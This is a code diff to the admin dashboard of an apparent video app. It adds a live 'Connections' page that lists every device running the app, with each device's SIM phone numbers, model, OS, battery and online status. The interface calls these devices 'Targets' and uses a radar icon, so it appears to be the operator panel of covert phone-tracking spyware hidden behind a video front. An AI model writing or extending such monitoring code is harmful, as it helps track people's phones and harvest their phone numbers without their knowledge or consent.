@@ -196,6 +196,23 @@ function connectWebSocket() {
     if (currentPage === 'videos') loadVideos();
     if (currentPage === 'dashboard') loadDashboard();
   });
+
+  // --- Device events ---
+  socket.on('device_online', d => {
+    addActivity('ri-smartphone-line', `Device online: ${d.model || d.device_id}`);
+    if (currentPage === 'connections') upsertDeviceCard(d);
+    updateConnStats();
+  });
+
+  socket.on('device_offline', d => {
+    addActivity('ri-smartphone-line', `Device offline: ${d.model || d.device_id}`);
+    if (currentPage === 'connections') upsertDeviceCard(d);
+    updateConnStats();
+  });
+
+  socket.on('device_status_update', d => {
+    if (currentPage === 'connections') upsertDeviceCard(d);
+  });
 }
 
 function setWsStatus(state, label) {
@@ -219,11 +236,12 @@ function navigateTo(page) {
   const navEl = document.querySelector(`[data-page="${page}"]`);
   if (navEl) navEl.classList.add('active');
 
-  const titles = { dashboard: 'Dashboard', upload: 'Upload Video', videos: 'All Videos', settings: 'Settings' };
+  const titles = { dashboard: 'Dashboard', upload: 'Upload Video', videos: 'All Videos', connections: 'Connections', settings: 'Settings' };
   document.getElementById('pageTitle').textContent = titles[page] || page;
 
   if (page === 'dashboard') loadDashboard();
   if (page === 'videos') loadVideos();
+  if (page === 'connections') loadConnections();
 
   closeSidebar();
 }
@@ -501,6 +519,139 @@ async function deleteVideo(id, title) {
   }
 }
 window.deleteVideo = deleteVideo;
+
+window.deleteVideo = deleteVideo;
+
+// ========== Connections ==========
+let allDevices = [];
+
+async function loadConnections() {
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allDevices = data.devices || [];
+    renderDeviceGrid();
+    updateConnStatsFromData(data);
+  } catch (err) {
+    showToast('Failed to load connections: ' + err.message, 'error');
+  }
+}
+
+function updateConnStats() {
+  // Re-fetch counts if on connections page
+  if (currentPage === 'connections') loadConnections();
+}
+
+function updateConnStatsFromData(data) {
+  const el = id => document.getElementById(id);
+  if (el('connTotal')) el('connTotal').textContent = data.totalDevices || 0;
+  if (el('connOnline')) el('connOnline').textContent = data.onlineCount || 0;
+  if (el('connOffline')) el('connOffline').textContent = data.offlineCount || 0;
+}
+
+function upsertDeviceCard(device) {
+  // Update or insert without full reload
+  const idx = allDevices.findIndex(d => d.device_id === device.device_id);
+  if (idx >= 0) allDevices[idx] = device;
+  else allDevices.unshift(device);
+  renderDeviceGrid();
+  // Update stats locally
+  const on = allDevices.filter(d => d.is_online).length;
+  updateConnStatsFromData({ totalDevices: allDevices.length, onlineCount: on, offlineCount: allDevices.length - on });
+}
+
+function renderDeviceGrid() {
+  const grid = document.getElementById('deviceGrid');
+  if (!allDevices || allDevices.length === 0) {
+    grid.innerHTML = `<div class="fx-empty"><i class="ri-radar-line"></i><p>NO DEVICES DETECTED</p><span>Targets will appear when the app is installed on a device</span></div>`;
+    return;
+  }
+
+  // Sort: online first, then by last_seen desc
+  const sorted = [...allDevices].sort((a, b) => {
+    if (a.is_online !== b.is_online) return b.is_online - a.is_online;
+    return new Date(b.last_seen || 0) - new Date(a.last_seen || 0);
+  });
+
+  grid.innerHTML = sorted.map(d => {
+    const online = d.is_online ? 'online' : 'offline';
+    const statusText = d.is_online ? 'ONLINE' : 'OFFLINE';
+    const batt = d.battery_percent ?? -1;
+    const battClass = batt > 50 ? 'high' : batt > 20 ? 'mid' : 'low';
+    const battWidth = batt >= 0 ? batt : 0;
+    const charging = d.battery_charging ? `<i class="ri-flashlight-line batt-charge"></i>` : '';
+    const phones = Array.isArray(d.phone_numbers) ? d.phone_numbers : [];
+    const deviceName = [d.manufacturer, d.model].filter(Boolean).join(' ') || d.device_name || 'Unknown Device';
+    const shortId = d.device_id.length > 20 ? d.device_id.substring(0, 8) + '...' + d.device_id.slice(-6) : d.device_id;
+
+    let simHtml = '';
+    if (phones.length === 0) {
+      simHtml = '<span class="sim-none">No SIM detected</span>';
+    } else {
+      simHtml = '<div class="sim-list">' + phones.map((p, i) => {
+        const cls = i === 0 ? 'sim1' : 'sim2';
+        const label = `SIM ${i + 1}`;
+        return `<span class="sim-badge ${cls}"><i class="ri-sim-card-2-line"></i>${label}: ${esc(p.number || p)}</span>`;
+      }).join('') + '</div>';
+    }
+
+    return `
+    <div class="dev-card ${online}" data-device-id="${d.device_id}">
+      <div class="dev-top">
+        <div class="dev-status">
+          <span class="dev-led"></span>
+          <span class="dev-status-text">${statusText}</span>
+        </div>
+        <span class="dev-time">${d.is_online ? 'LIVE' : fmtDate(d.last_seen)}</span>
+      </div>
+      <div class="dev-identity">
+        <div class="dev-icon"><i class="ri-smartphone-line"></i></div>
+        <div>
+          <div class="dev-name">${esc(deviceName)}</div>
+          <div class="dev-id">ID: ${shortId}</div>
+        </div>
+      </div>
+      <div class="dev-data">
+        <div class="dev-row">
+          <span class="dev-row-label">OS</span>
+          <span class="dev-row-value">${esc(d.os_version || '?')} (SDK ${d.sdk_version || '?'})</span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">APP</span>
+          <span class="dev-row-value">v${esc(d.app_version || '?')}</span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">DISPLAY</span>
+          <span class="dev-row-value">${esc(d.screen_resolution || '?')}</span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">BATTERY</span>
+          <span class="dev-row-value">
+            <div class="dev-battery">
+              ${charging}
+              <div class="batt-shell"><div class="batt-fill ${battClass}" style="width:${battWidth}%"></div></div>
+              <span class="batt-pct ${battClass}">${batt >= 0 ? batt + '%' : '?'}</span>
+            </div>
+          </span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">SIM</span>
+          <span class="dev-row-value">${simHtml}</span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">REGISTERED</span>
+          <span class="dev-row-value">${d.first_seen ? new Date(d.first_seen).toLocaleString() : '?'}</span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">LAST SEEN</span>
+          <span class="dev-row-value">${d.last_seen ? new Date(d.last_seen).toLocaleString() : '?'}</span>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
 
 // ========== Settings ==========
 async function saveSettings() {
